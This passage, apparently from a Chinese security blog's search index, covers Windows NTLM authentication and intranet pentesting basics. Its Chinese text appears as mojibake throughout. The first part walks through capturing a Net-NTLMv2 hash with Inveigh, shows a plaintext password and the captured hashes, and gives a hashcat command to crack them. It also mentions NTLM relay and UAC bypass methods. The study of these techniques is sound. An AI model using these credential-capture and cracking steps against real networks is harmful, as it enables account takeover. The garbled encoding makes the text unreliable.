ï¼Œç„¶åå’Œç”¨æˆ·åå¯¹åº”å¯†ç çš„ NTLM HASHå€¼è¿›è¡ŒHMAC-MD5åŠ å¯† blobæ˜¯ç”±æ—¶é—´ã€ç›®æ ‡ä¿¡æ¯ã€éšæœºå¡«å……å­—ç¬¦ç”Ÿæˆ è®¡ç®—å…¬å¼å¦‚ä¸‹: NTLMv2Hash= HMAC-MD5(unicode(hex(upper(UserName)+DomainName))),NTLM Hash) NTProofStr=HMAC-MD5(challenge+blob,NTLM v2 Hash) æˆ‘ä»¬å¹³æ—¶åˆ©ç”¨å·¥å…·æ”»å‡»æ—¶ æŠ“åˆ°çš„å¾€å¾€æ˜¯ Net-NTLM Hashæ•°æ® Net-NTLM-Hashæ ¼å¼ä»‹ç»åŠæ‹¼æ¥Net-NTLM-v2-Hashçš„æ ¼å¼ä¸ºï¼šusername::domain:challenge:HMAC-MD5:blob å«ä¹‰: username è¦è®¿é—®æœåŠ¡å™¨çš„ç”¨æˆ·å domain åŸŸä¿¡æ¯ challenge æ•°æ®åŒ…6ä¸­çš„æœåŠ¡å™¨è¿”å›çš„challengeå€¼ HMAC-MD5 æ•°æ®åŒ…7ä¸­çš„NTProofStr blob å¯¹åº”æ•°æ®åŒ…7ä¸­NTLM v2 Responseå»æ‰NTProofStrçš„ååŠéƒ¨åˆ† æˆ‘ä»¬åˆ©ç”¨ä¸­é—´äººæ”»å‡» Inveighå·¥å…·æŠ“å–ä¸€ä¸‹ Net-NTLM-v2-Hash å€¼ 123456powershellPS C:\\Users\\Administrator\\Desktop\\Inveigh&gt; Import-Module .\\Inveigh.ps1PS C:\\Users\\Administrator\\Desktop\\Inveigh&gt; Invoke-Inveigh -ConsoleOutput Y -FileOutput y# ä¸èƒ½åŠ è½½çš„è¯å°±æ‰§è¡Œä¸€ä¸‹ set-ExecutionPolicy RemoteSignednet use \\\\192.168.16.10\\ipc$ /u:administrator Admin@123 1administrator::WIN2008:D5E3F1B5CF0101C8:692B3996DC8BF7F0DA9598E6B59DC63D:010100000000000078C3246656F7D901A0EB39BDD6C96EBA00000000020008004800410043004B000100040044004300040010006800610063006B002E0063006F006D0003001600440043002E006800610063006B002E0063006F006D00050010006800610063006B002E0063006F006D000700080078C3246656F7D90106000400020000000800300030000000000000000000000000300000B2B92C5F984625F199A7B3DA00A7897FD7B57990D2735F2E8E9198F48ADD0A8E0A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00310036002E0031003000000000000000000000000000 å¯ä»¥çœ‹åˆ° å·¥å…·æŠ“å–çš„challengeå’ŒNTProofStrè·Ÿwiresharkçš„æ˜¯ä¸€æ ·çš„ 1234NTLM HASHï¼š570a9a65db8fba761c1008a51d4c95abchallengeï¼šD5E3F1B5CF0101C8NTProofStrï¼š692B3996DC8BF7F0DA9598E6B59DC63Dblobï¼š010100000000000078C3246656F7D901A0EB39BDD6C96EBA00000000020008004800410043004B000100040044004300040010006800610063006B002E0063006F006D0003001600440043002E006800610063006B002E0063006F006D00050010006800610063006B002E0063006F006D000700080078C3246656F7D90106000400020000000800300030000000000000000000000000300000B2B92C5F984625F199A7B3DA00A7897FD7B57990D2735F2E8E9198F48ADD0A8E0A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00310036002E0031003000000000000000000000000000 æˆ‘ä»¬åˆ©ç”¨è·å–çš„ä¿¡æ¯æ‰‹åŠ¨è®¡ç®—ä¸€ä¸‹ï¼Œä½“ä¼šåŠ å¯†è¿‡ç¨‹ è®¡ç®—NTLM-v2-HASH å°† administratorè½¬åŒ–ä¸ºå¤§å†™ï¼šADMINISTRATOR ç„¶åä¸åŸŸåWIN2008 æ‹¼æ¥èµ·æ¥ï¼šADMINISTRATORWIN2008 è½¬åŒ–æˆ16è¿›åˆ¶ï¼š41444d494e4953545241544f5257494e32303038 è½¬åŒ–ä¸ºunicodeæ ¼å¼ï¼š410044004d0049004e004900530054005200410054004f005200570049004e003200300030003800 ç„¶å ç”¨NTLM HASHï¼š570a9a65db8fba761c1008a51d4c95ab ä½œä¸ºkey å¯¹ä¸Šè¿°è¿›è¡ŒHMAC-MD5åŠ å¯† å¾—åˆ°ï¼še864d6b3c317322f934b6df3d5c44ffa å³ NTLM-v2-HASHçš„å€¼ è®¡ç®— NTProofStr å°† NTLM-v2-HASHå€¼ e864d6b3c317322f934b6df3d5c44ffa ä½œä¸ºkey å°† challenge ä¸ blob å€¼æ‹¼æ¥èµ·æ¥ï¼šD5E3F1B5CF0101C8010100000000000078C3246656F7D901A0EB39BDD6C96EBA00000000020008004800410043004B000100040044004300040010006800610063006B002E0063006F006D0003001600440043002E006800610063006B002E0063006F006D00050010006800610063006B002E0063006F006D000700080078C3246656F7D90106000400020000000800300030000000000000000000000000300000B2B92C5F984625F199A7B3DA00A7897FD7B57990D2735F2E8E9198F48ADD0A8E0A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00310036002E0031003000000000000000000000000000 å°† NTLM-v2-hashä½œä¸ºkey å¯¹ä¸Šè¿°æ•°æ®è¿›è¡Œ HMAC-MD5åŠ å¯†ï¼Œå¾—åˆ°ï¼š692b3996dc8bf7f0da9598e6b59dc63d éªŒè¯ä¸€ä¸‹ ä¸€è‡´ ä½¿ç”¨hashcatç ´è§£NET-NTLM hashhashcat [option] -mï¼šhash-typeï¼Œ5600å¯¹åº”NetNTLMv2ï¼Œè¯¦ç»†å‚æ•°å¯æŸ¥è¡¨ï¼šhttps://hashcat.net/wiki/doku.php -oï¼šè¾“å‡ºæ–‡ä»¶ å­—å…¸æ–‡ä»¶ä¸º1.txt â€“forceä»£è¡¨å¼ºåˆ¶æ‰§è¡Œ hashcat çˆ†ç ´ä¸€ä¸‹æˆ‘ä»¬ä¸Šé¢å¾—åˆ°çš„ NET-NTLM-Hash 1hashcat -m 5600 administrator::WIN2008:D5E3F1B5CF0101C8:692B3996DC8BF7F0DA9598E6B59DC63D:010100000000000078C3246656F7D901A0EB39BDD6C96EBA00000000020008004800410043004B000100040044004300040010006800610063006B002E0063006F006D0003001600440043002E006800610063006B002E0063006F006D00050010006800610063006B002E0063006F006D000700080078C3246656F7D90106000400020000000800300030000000000000000000000000300000B2B92C5F984625F199A7B3DA00A7897FD7B57990D2735F2E8E9198F48ADD0A8E0A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00310036002E0031003000000000000000000000000000 rockyou.txt -o result.txt --force (7) NTLMåè®®çš„å®‰å…¨æ€§é—®é¢˜ Net-NTLM v1 v2 Hashç ´è§£ï¼šv1 ä½¿ç”¨DESåŠ å¯†ï¼Œæ›´å®¹æ˜“ç ´è§£ã€‚v2ç‰ˆæœ¬çš„è¯å¯ä»¥é€šè¿‡ç¢°æ’ã€å½©è™¹è¡¨ã€æš´åŠ›çŒœè§£ç­‰æ–¹å¼ï¼Œè·å–æ˜æ–‡è´¦å·å¯†ç  NTLM-relayæ”»å‡»ï¼šé€šè¿‡ä¸­é—´äººæ”»å‡»ï¼Œå¦‚æœè·å¾—äº† Net-NTLM Hashå€¼ï¼Œå¦‚æœçˆ†ç ´ä¸å‡ºå¯†ç  å¯ä»¥è€ƒè™‘NTLM-relayæ”»å‡»ï¼Œå¯ä»¥é‡æ”¾ è¿›è¡Œè®¤è¯ å‚è€ƒï¼šhttps://chenchena.blog.csdn.net/article/details/123274876?spm=1001.2014.3001.5502 &lt;4&gt; KerberosåŸŸè®¤è¯â˜…","link":"/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/"},{"title":"ç¬¬ä¸€ç« -å†…ç½‘æ¸—é€åŸºç¡€","text":"&lt;1&gt; å†…ç½‘åŸºç¡€çŸ¥è¯†å†…ç½‘æ¦‚è¿°ï¼š å†…ç½‘ä¹ŸæŒ‡å±€åŸŸç½‘ï¼ˆLocal Area Network LANï¼‰æ˜¯æŒ‡æŸä¸€åŒºåŸŸå†…å¤šå°è®¡ç®—æœºäº’è”ç»„æˆçš„è®¡ç®—æœºç»„ã€‚å±€åŸŸç½‘å¯ä»¥å®ç°æ–‡ä»¶ç®¡ç†ã€åº”ç”¨è½¯ä»¶å…±äº«ã€æ‰“å°æœºå…±äº«ã€å·¥ä½œç»„çš„å†ç¨‹å®‰æ’ã€ç”µå­é‚®ä»¶å’Œä¼ çœŸé€šä¿¡æœåŠ¡ç­‰åŠŸèƒ½ã€‚ å†…ç½‘æ˜¯å°é—­å‹çš„ï¼Œå¯ä»¥ç”±åŠå…¬å®¤å†…ä¸¤å°è®¡ç®—æœºç»„æˆï¼Œä¹Ÿå¯ä»¥ç”±ä¸€ä¸ªå…¬å¸å†…å‡ åƒå°è®¡ç®—æœºç»„æˆã€‚ä¾‹å¦‚ï¼šé“¶è¡Œã€å­¦æ ¡ã€ä¼ä¸šã€æ”¿åºœæœºå…³ã€å•ä½åŠå…¬ç½‘ç­‰éƒ½å±äºæ­¤ç±» æˆ‘ä»¬åœ¨ç ”ç©¶å†…ç½‘çš„æ—¶å€™ï¼Œç»å¸¸ä¼šå¬åˆ°ä¸€äº›ä¾‹å¦‚ â€œå·¥ä½œç»„â€ã€â€åŸŸâ€ã€â€åŸŸæ§åˆ¶å™¨(DC)â€ã€â€çˆ¶åŸŸâ€ã€â€å­åŸŸâ€ ã€åŸŸæ ‘â€ã€â€åŸŸæ£®æ—â€ã€â€æ´»åŠ¨ç›®å½•(AD)â€ã€â€DMZâ€ã€â€åŸŸå†…æƒé™â€ ç­‰ç­‰ä¸“æœ‰åè¯ å®ƒä»¬æŒ‡çš„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿåˆæœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ (1) å·¥ä½œç»„1. æ¦‚å¿µWork Groupï¼šåœ¨ä¸€ä¸ªå¤§çš„å•ä½é‡Œï¼Œå¯èƒ½æœ‰ä¸Šåƒå°ç”µè„‘äº’ç›¸ç»„æˆå±€åŸŸç½‘ã€‚ä»–ä»¬åˆ—åœ¨ç½‘ç»œå†…ï¼Œå¦‚æœè¿™äº›ç”µè„‘ä¸åˆ†ç»„ï¼Œä¼šååˆ†æ··ä¹±ï¼Œè¦æ‰¾ä¸€å°ç”µè„‘å¾ˆå›°éš¾ã€‚ å’Œæˆ‘ä»¬çš„ä¸‹è½½çš„è½¯ä»¶åˆ†ç±»å·®ä¸å¤šï¼Œä¸åˆ†ç»„çš„è¯æ‰¾èµ·æ¥ä¼šå¾ˆå›°éš¾ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæœ‰äº†â€å·¥ä½œç»„â€çš„æ¦‚å¿µã€‚ æˆ‘ä»¬å°†ä¸åŒçš„ç”µè„‘æŒ‰åŠŸèƒ½ï¼ˆæˆ–éƒ¨é—¨ï¼‰åˆ†åˆ«åˆ—å…¥ä¸åŒçš„å·¥ä½œç»„ä¸­ã€‚ä½ è¦è®¿é—®å“ªä¸ªéƒ¨é—¨èµ„æºï¼Œç›´æ¥åœ¨â€ç½‘ç»œâ€é‡Œæ‰¾åˆ°é‚£ä¸ªéƒ¨é—¨çš„å·¥ä½œç»„åï¼ŒåŒå‡»å°±å¯ä»¥çœ‹åˆ°é‚£ä¸ªéƒ¨é—¨çš„æ‰€æœ‰ç”µè„‘äº†ã€‚è¿™æ ·ç›¸æ¯”äºä¸åˆ†ç»„çš„æƒ…å†µï¼Œå¯¹é‚£ç§å¤§å‹ç½‘ç»œæ¥è¯´ï¼Œä¼šå˜å¾—ååˆ†æœ‰åº 2. åŠ å…¥/åˆ›å»ºå·¥ä½œç»„ å³é”®æ¡Œé¢ä¸Šçš„â€è®¡ç®—æœºâ€ï¼Œå¼¹å‡ºçš„èœå•é‡Œé€‰æ‹©â€å±æ€§â€ï¼Œç‚¹å‡»â€æ›´æ”¹è®¾ç½®â€ï¼Œâ€æ›´æ”¹â€ åœ¨â€è®¡ç®—æœºåâ€ä¸€æ è¾“å…¥ä½ æƒ³å¥½çš„åç§°ï¼Œåœ¨â€å·¥ä½œç»„â€ä¸€æ è¾“å…¥ä½ æƒ³è¦åŠ å…¥çš„å·¥ä½œç»„åç§° å¦‚æœä½ è¾“å…¥çš„å·¥ä½œç»„åç§°ç½‘ç»œä¸­æ²¡æœ‰ï¼Œé‚£ä¹ˆç›¸å½“äºæ–°å»ºäº†ä¸€ä¸ªå·¥ä½œç»„ï¼Œå½“ç„¶æš‚æ—¶åªæœ‰ä½ çš„ç”µè„‘åœ¨ç»„å†…ï¼Œé‡æ–°å¯åŠ¨ä¹‹åï¼Œå†ç‚¹å‡»è¿›å…¥â€ç½‘ç»œâ€ï¼Œå°±å¯ä»¥çœ‹åˆ°ä½ æ‰€åŠ å…¥çš„å·¥ä½œç»„æˆå‘˜äº† 3. é€€å‡ºå·¥ä½œç»„ åªè¦å°†å·¥ä½œç»„åç§°æ”¹åŠ¨å³å¯ã€‚ä¸è¿‡åœ¨ç½‘ä¸Šåˆ«äººç…§æ ·å¯ä»¥è®¿é—®ä½ çš„å…±äº«èµ„æºã€‚ä½ ä¹Ÿå¯ä»¥éšä¾¿åŠ å…¥åŒä¸€ç½‘ç»œä¸Šçš„ä»»ä½•å…¶ä»–å·¥ä½œç»„ã€‚â€å·¥ä½œç»„â€å°±åƒä¸€ä¸ªå¯ä»¥è‡ªç”±è¿›å…¥å’Œé€€å‡ºçš„â€ç¤¾å›¢â€ï¼Œæ–¹ä¾¿åŒä¸€ç»„çš„è®¡ç®—æœºäº’ç›¸è®¿é—®ã€‚ æ‰€ä»¥å·¥ä½œç»„å¹¶ä¸å­˜åœ¨çœŸæ­£çš„é›†ä¸­ç®¡ç†ä½œç”¨ï¼Œå·¥ä½œç»„é‡Œçš„æ‰€æœ‰è®¡ç®—æœºéƒ½æ˜¯å¯¹ç­‰çš„ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰æœåŠ¡å™¨å’Œå®¢æˆ·æœºä¹‹åˆ†çš„ã€‚ 4. æœ¬åœ°å·¥ä½œç»„æƒé™è§£è¯»æœ€é«˜ç®¡ç†å‘˜æƒé™Administrator å³ç³»ç»Ÿè¶…çº§ç®¡ç†å‘˜ æˆ– è¶…çº§ç”¨æˆ· Administrator ç”¨æˆ·åœ¨å®¶åº­ç‰ˆçš„ç”µè„‘ä¸­å±äºæ˜¯ç¦ç”¨çš„çŠ¶æ€ï¼Œåœ¨ä¸“ä¸šç‰ˆå’Œwin serveré‡Œæ˜¯å¼€å¯çš„ Administrator ç”¨æˆ·çš„SID æœ€åä¸€ä½æ˜¯500 Administrator ç”¨æˆ·é»˜è®¤åœ¨ administratorç»„ä¸­ æœ¬åœ°æ™®é€šç®¡ç†å‘˜æƒé™æœ¬åœ°æ™®é€šç®¡ç†å‘˜æ˜¯æŒ‡ åŠ å…¥äº† administratorç»„ ä½†ä¸æ˜¯administratorç”¨æˆ·æœ¬èº«çš„ç®¡ç†å‘˜ ç”±äºUAC è®¤è¯çš„å­˜åœ¨ï¼Œä»–çš„æƒé™æ˜¯ä¸å¦‚ administrator è¶…çº§ç®¡ç†å‘˜çš„ æƒ³æ‰§è¡Œä¸€äº›é«˜æƒé™çš„æ“ä½œï¼Œcmd å¿…é¡»å³é”® ä½¿ç”¨ç®¡ç†å‘˜èº«ä»½æ‰“å¼€ æœ¬åœ°æ™®é€šç”¨æˆ·windowsé‡Œçš„æ™®é€šç”¨æˆ·ï¼Œå¾ˆå¤šæ“ä½œæ‰§è¡Œä¸äº†ï¼Œéœ€è¦ç®¡ç†å‘˜è®¤è¯ä¹‹åæ‰å¯ä»¥ï¼Œé»˜è®¤æ˜¯userç»„ UACè®¤è¯UAC å³User Account Controlï¼Œç”¨æˆ·å¸æˆ·æ§åˆ¶ï¼Œæ˜¯å¾®è½¯åœ¨Windows Vistaå’ŒWin7ä¸­å¼•ç”¨çš„æ–°æŠ€æœ¯ï¼Œä¸»è¦åŠŸèƒ½æ˜¯è¿›è¡Œä¸€äº›ä¼šå½±å“ç³»ç»Ÿå®‰å…¨çš„æ“ä½œæ—¶ï¼Œä¼šè‡ªåŠ¨è§¦å‘UACï¼Œç”¨æˆ·ç¡®è®¤åæ‰èƒ½æ‰§è¡Œ å¤§éƒ¨åˆ†çš„æ¶æ„è½¯ä»¶ã€æœ¨é©¬ç—…æ¯’ã€å¹¿å‘Šæ’ä»¶åœ¨è¿›å…¥è®¡ç®—æœºæ—¶éƒ½ä¼šæœ‰å¦‚ï¼šå°†æ–‡ä»¶å¤åˆ¶åˆ°Windowsæˆ–Program Filesç­‰ç›®å½•ã€å®‰è£…é©±åŠ¨ã€å®‰è£… ActiveX ç­‰æ“ä½œï¼Œè€Œè¿™äº›æ“ä½œéƒ½ä¼šè§¦å‘UACã€‚é¢å¯¹è¿™äº›ä¸å®‰å…¨çš„å› ç´ ï¼Œç”¨æˆ·å¯ä»¥åœ¨UACæç¤ºæ—¶æ¥ç¦æ­¢è¿™äº›ç¨‹åºçš„è¿è¡Œ å®ƒä¼šåœ¨ç”¨æˆ·å°è¯•è¿è¡Œéœ€è¦ç®¡ç†å‘˜æƒé™çš„ä»»åŠ¡ã€æ›´æ”¹ç³»ç»Ÿè®¾ç½®ç­‰æ“ä½œæ—¶ï¼Œé€šçŸ¥ç”¨æˆ·å¹¶è¦æ±‚ç”¨æˆ·æä¾›ç®¡ç†å‘˜å¯†ç æˆ–ç¡®è®¤æ‰§è¡Œæ­¤é¡¹æ“ä½œ å–å†³äºæ‰§è¡Œæ­¤æ“ä½œçš„æ˜¯ æ™®é€šç®¡ç†å‘˜è¿˜æ˜¯æ™®é€šç”¨æˆ·ï¼Œæ™®é€šç”¨æˆ·æ˜¯éœ€è¦è¾“å…¥å¯†ç çš„ï¼Œæ™®é€šç®¡ç†å‘˜åˆ™åªéœ€è¦æ˜¯æˆ–è€…å¦å³å¯ã€‚UACåœ¨ä¿æŠ¤ç³»ç»Ÿå®‰å…¨ä¸Šèµ·åˆ°äº†é‡è¦çš„ä½œç”¨ï¼Œä½†å®ƒä¹Ÿå¯èƒ½å¯¹ç”¨æˆ·çš„ä½¿ç”¨é€ æˆä¸ä¾¿ ç»•è¿‡UACä¹Ÿæœ‰å¾ˆå¤šæ–¹æ³• æ¯”å¦‚ï¼š dllåŠ«æŒã€ç™½åå•ã€bypassuacç­‰æ–¹æ³• UACçš„è§¦å‘æ¡ä»¶ï¼š ä¿®æ”¹ Windows Updateè®¾ç½® å¢åŠ æˆ–åˆ é™¤ç”¨æˆ· æ”¹å˜ç”¨æˆ·è´¦æˆ·ç±»å‹ ä¿®æ”¹UACè®¾ç½® å®‰è£…ActiveX å®‰è£…æˆ–å¸è½½ç¨‹åº å®‰è£…è®¾å¤‡é©±åŠ¨ å¢åŠ æˆ–ä¿®æ”¹æ³¨å†Œè¡¨ å°†æ–‡ä»¶ç§»åŠ¨æˆ–å¤åˆ¶åˆ° Program Filesæˆ– Windowsç›®å½• è®¿é—®å…¶ä»–ç”¨æˆ·ç›®å½• UAC çš„å››ç§è®¾ç½®ï¼š Win+R â€” msconfig å§‹ç»ˆé€šçŸ¥ ä»…åœ¨ç¨‹åºå°è¯•å¯¹æˆ‘çš„è®¡ç®—æœºè¿›è¡Œæ›´æ”¹æ—¶é€šçŸ¥ ä»Šå½“ç¨‹åºå°è¯•æ›´æ”¹è®¡ç®—æœºæ—¶é€šçŸ¥(ä¸é™ä½æ¡Œé¢äº®åº¦) ä»ä¸é€šçŸ¥ æœ¬åœ°ç³»ç»Ÿæœ€é«˜æƒé™ SYSTEMSYSTEM å³åœ¨ windowsä¸­ä¸»è¦ä½œä¸ºç³»ç»ŸæœåŠ¡æˆ–è¿›ç¨‹çš„è¿è¡Œè´¦æˆ· SYSTEM ä¸ Administratoræƒé™åŒºåˆ« Administratoræ˜¯ç³»ç»Ÿå†…ç½®çš„ç®¡ç†å‘˜ç”¨æˆ·ï¼Œä¸€èˆ¬å¹³æ—¶å®‰è£…ã€è¿è¡Œç¨‹åºã€ä¿®æ”¹ç³»ç»Ÿè®¾ç½®ç­‰ç­‰éƒ½æ˜¯ä»¥è¿™ä¸ªèº«ä»½çš„æƒé™è¿è¡Œ SYSTEMæ˜¯ç³»ç»Ÿæœ¬èº«çš„æƒé™ï¼Œæ¯”å¦‚ä»»åŠ¡ç®¡ç†å™¨é‡Œé¢çš„ winlogon.exeã€svchost.exe è¿™äº›è¿›ç¨‹ç­‰ç­‰ï¼Œæ³¨å†Œè¡¨é‡Œæœ‰äº›åœ°æ–¹åªæœ‰SYSTEMå¯ä»¥è®¿é—®ï¼ŒAdministratorç”¨æˆ·ä¸èƒ½è®¿é—® ä¸¤è€…æƒé™éƒ½å·®ä¸å¤šï¼Œåªæ˜¯è´Ÿè´£çš„åœ°æ–¹ä¸åŒï¼Œæ‹¿åˆ°å…¶ä¸­ä¸€ä¸ªæƒé™ï¼Œåˆ‡æ¢åˆ°å¦ä¸€ä¸ªæƒé™ä¹Ÿæ˜¯å¾ˆå®¹æ˜“çš„ è®¡åˆ’ä»»åŠ¡ã€ä»¤ç‰Œç­‰ 5. ä¸€ä¸ªé—®é¢˜å‡å¦‚ä¸€ä¸ªå…¬å¸æœ‰200å°ç”µè„‘ï¼Œæˆ‘ä»¬å¸Œæœ›æŸå°ç”µè„‘ä¸Šçš„è´¦æˆ·Alanå¯ä»¥è®¿é—®æ¯å°ç”µè„‘å†…çš„èµ„æºæˆ–è€…å¯ä»¥åœ¨æ¯å°ç”µè„‘ä¸Šç™»å½•ã€‚é‚£ä¹ˆåœ¨â€å·¥ä½œç»„â€ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬å¿…é¡»è¦åœ¨è¿™200å°ç”µè„‘çš„å„ä¸ªSAMæ•°æ®åº“ä¸­åˆ›å»ºAlanè¿™ä¸ªè´¦æˆ·ã€‚ä¸€æ—¦Alanæƒ³è¦æ›´æ¢å¯†ç ï¼Œå¿…é¡»è¦æ›´æ”¹200æ¬¡ï¼ç°åœ¨åªæ˜¯200å°ç”µè„‘çš„å…¬å¸ï¼Œå¦‚æœæ˜¯æœ‰5000å°ç”µè„‘æˆ–è€…ä¸Šä¸‡å°ç”µè„‘çš„å…¬å¸å‘¢ï¼Ÿ ä¼°è®¡ç®¡ç†å‘˜ä¼šæŠ“ç‹‚ï¼Œç­‰æˆ‘ä»¬çœ‹å®Œä¸‹é¢çš„ åŸŸ å’Œ æ´»åŠ¨ç›®å½• ï¼Œå°±å¯ä»¥æœ‰æ›´å¥½çš„åŠæ³•äº†ã€‚ (2) åŸŸ1. æ¦‚å¿µåŸŸï¼ˆDomainï¼‰æ˜¯ä¸€ä¸ªæœ‰å®‰å…¨è¾¹ç•Œçš„è®¡ç®—æœºé›†åˆï¼ˆå®‰å…¨è¾¹ç•Œæ„æ€æ˜¯åœ¨ä¸¤ä¸ªåŸŸä¸­ï¼Œä¸€ä¸ªåŸŸä¸­çš„ç”¨æˆ·æ— æ³•è®¿é—®å¦ä¸€ä¸ªåŸŸä¸­çš„èµ„æºï¼‰ï¼Œå¯ä»¥ç®€å•çš„æŠŠåŸŸç†è§£æˆå‡çº§ç‰ˆçš„â€œå·¥ä½œç»„â€ï¼Œç›¸æ¯”å·¥ä½œç»„è€Œè¨€ï¼Œå®ƒæœ‰ä¸€ä¸ªæ›´åŠ ä¸¥æ ¼çš„å®‰å…¨ç®¡ç†æ§åˆ¶æœºåˆ¶ï¼Œå¦‚æœä½ æƒ³è®¿é—®åŸŸå†…çš„èµ„æºï¼Œå¿…é¡»æ‹¥æœ‰ä¸€ä¸ªåˆæ³•çš„èº«ä»½ç™»é™†åˆ°è¯¥åŸŸä¸­ï¼Œè€Œä½ å¯¹è¯¥åŸŸå†…çš„èµ„æºæ‹¥æœ‰ä»€ä¹ˆæ ·çš„æƒé™ï¼Œè¿˜éœ€è¦å–å†³äºä½ åœ¨è¯¥åŸŸä¸­çš„ç”¨æˆ·èº«ä»½ åŸŸæ§åˆ¶å™¨ï¼ˆDomain Controllerï¼Œå³DCï¼‰æ˜¯ä¸€ä¸ªåŸŸä¸­çš„ä¸€å°ç±»ä¼¼ç®¡ç†æœåŠ¡å™¨çš„è®¡ç®—æœºï¼Œç›¸å½“äºä¸€ä¸ªå•ä½çš„é—¨å«ä¸€æ ·ï¼Œå®ƒè´Ÿè´£æ¯ä¸€å°è”å…¥çš„ç”µè„‘å’Œç”¨æˆ·çš„éªŒè¯å·¥ä½œï¼ŒåŸŸå†…ç”µè„‘å¦‚æœæƒ³äº’ç›¸è®¿é—®é¦–å…ˆéƒ½æ˜¯ç»è¿‡å®ƒçš„å®¡æ ¸ã€‚å³éªŒè¯ç”¨æˆ·çš„èº«ä»½ åŸŸæ§åˆ¶å™¨ä¸­å­˜åœ¨ç”±è¿™ä¸ªåŸŸçš„è´¦æˆ·ã€å¯†ç ã€å±äºè¿™ä¸ªåŸŸçš„è®¡ç®—æœºç­‰ä¿¡æ¯æ„æˆçš„æ•°æ®åº“ã€‚å½“è®¡ç®—æœºè¿æ¥åˆ°åŸŸæ—¶ï¼ŒåŸŸæ§åˆ¶å™¨é¦–å…ˆè¦é‰´åˆ«è¿™å°è®¡ç®—æœºæ˜¯å¦å±äºè¿™ä¸ªåŸŸï¼Œä»¥åŠç”¨æˆ·ä½¿ç”¨çš„ç™»é™†è´¦å·æ˜¯å¦å­˜åœ¨ã€å¯†ç æ˜¯å¦æ­£ç¡®ã€‚è‹¥ä»¥ä¸Šä¿¡æ¯ä¸æ­£ç¡®åˆ™æ‹’ç»è¿™å°è®¡ç®—æœºçš„ç™»é™†ï¼Œè¿›è€Œä¸èƒ½è®¿é—®æœåŠ¡å™¨ä¸­çš„èµ„æºã€‚å› è€ŒDCæ˜¯ååˆ†é‡è¦çš„ã€‚ åŸŸæ§åˆ¶å™¨æ˜¯æ•´ä¸ªåŸŸçš„é€šä¿¡æ¢çº½ï¼Œæ‰€æœ‰çš„æƒé™èº«ä»½éªŒè¯éƒ½åœ¨åŸŸæ§åˆ¶å™¨ä¸Šè¿›è¡Œï¼Œå³åŸŸå†…æ‰€æœ‰ç”¨æ¥éªŒè¯è¿‡èº«ä»½çš„è´¦å·å’Œå¯†ç hashæ•£åˆ—å€¼éƒ½ä¿å­˜åœ¨åŸŸæ§åˆ¶å™¨ä¸­ã€‚å†…ç½‘æ¸—é€çš„ç›®çš„å°±æ˜¯ä¸ºäº†è·å¾—åŸŸæ§åˆ¶å™¨ å®‰å…¨åŸŸåˆ’åˆ† è¿™é‡Œå°±æ˜¯ä¸¤ä¸ªè¾¹ç•Œï¼Œä¸¤ä¸ªåŸŸã€‚å¦‚æœé‚£ä¸ªç”µå­å•†åŠ¡æœåŠ¡å™¨ï¼Œæƒ³è®¿é—®é‡Œé¢é‚£ä¸ªåŸŸçš„æœåŠ¡å™¨ï¼Œéœ€è¦æœ‰ä¸€ä¸ªåˆæ³•çš„èº«ä»½ç™»å…¥é‚£ä¸ªåŸŸä¸­ã€‚ 2. åŸŸçš„åˆ†ç±»å•åŸŸ çˆ¶åŸŸï¼Œå­åŸŸ åŸŸæ ‘ï¼ˆtreeï¼‰ åŸŸæ£®æ—ï¼ˆforestï¼‰ DNSåŸŸåæœåŠ¡å™¨ 2.1 å•åŸŸ åœ¨ä¸€èˆ¬çš„å…·æœ‰å›ºå®šåœ°ç†ä½ç½®çš„å°å…¬å¸é‡Œï¼Œå»ºç«‹ä¸€ä¸ªåŸŸå°±å¯ä»¥æ»¡è¶³æ‰€éœ€ã€‚ ä¸€èˆ¬åœ¨ä¸€ä¸ªåŸŸå†…è¦å»ºç«‹è‡³å°‘ä¸¤ä¸ªåŸŸæœåŠ¡å™¨ï¼Œä¸€ä¸ªä½œä¸ºDCï¼Œä¸€ä¸ªæ˜¯å¤‡ä»½DCã€‚å¦‚æœæ²¡æœ‰ç¬¬äºŒä¸ªå¤‡ä»½DCï¼Œé‚£ä¹ˆä¸€æ—¦DCç˜«ç—ªäº†ï¼Œåˆ™åŸŸå†…çš„å…¶ä»–ç”¨æˆ·å°±ä¸èƒ½ç™»é™†è¯¥åŸŸäº†ï¼Œå› ä¸ºæ´»åŠ¨ç›®å½•çš„æ•°æ®åº“ï¼ˆåŒ…æ‹¬ç”¨æˆ·çš„å¸å·ä¿¡æ¯ï¼‰æ˜¯å­˜å‚¨åœ¨DCä¸­çš„ã€‚è€Œæœ‰ä¸€å°å¤‡ä»½åŸŸæ§åˆ¶å™¨ï¼ˆBDCï¼‰ï¼Œåˆ™è‡³å°‘è¯¥åŸŸè¿˜èƒ½æ­£å¸¸ä½¿ç”¨ï¼ŒæœŸé—´æŠŠç˜«ç—ªçš„DCæ¢å¤äº†å°±è¡Œäº†ã€‚ 2.2 çˆ¶åŸŸå‡ºäºç®¡ç†åŠå…¶ä»–ä¸€äº›éœ€æ±‚ï¼Œéœ€è¦åœ¨ç½‘ç»œä¸­åˆ’åˆ†å¤šä¸ªåŸŸï¼Œç¬¬ä¸€ä¸ªåŸŸç§°ä¸ºçˆ¶åŸŸï¼Œå„åˆ†éƒ¨çš„åŸŸç§°ä¸ºè¯¥åŸŸçš„å­åŸŸã€‚ æ¯”å¦‚ä¸€ä¸ªå¤§å…¬å¸ï¼Œå®ƒçš„ä¸åŒåˆ†å…¬å¸åœ¨ä¸åŒçš„åœ°ç†ä½ç½®ï¼Œåˆ™éœ€çˆ¶åŸŸåŠå­åŸŸè¿™æ ·çš„ç»“æ„ã€‚ 